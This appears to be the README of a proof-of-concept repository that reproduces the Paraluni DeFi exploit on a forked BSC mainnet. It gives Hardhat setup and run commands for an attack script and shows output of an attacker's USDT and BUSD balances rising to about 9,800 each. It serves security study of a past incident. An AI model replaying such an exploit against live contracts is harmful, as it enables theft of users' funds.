# Paraluni re-hack PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/bsc/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
Exploit contract deployed to:  0x17dA40e699969d0Fd36551E5a029f5bE01b760B9
USDT balance of attacker: 0.0
BUSD balance of attacker: 0.0
Exploiting...
Exploit complete.
USDT balance of attacker: 9846.377790107105937968
BUSD balance of attacker: 9874.93734335839598
```
This means the attack is complete
> The block height of the fork is 16008280


## Link

* https://mobile.twitter.com/paraluni/status/1502951606202994694
* https://mp.weixin.qq.com/s/a5fFI5sFNAyuDxGqTFmC2A
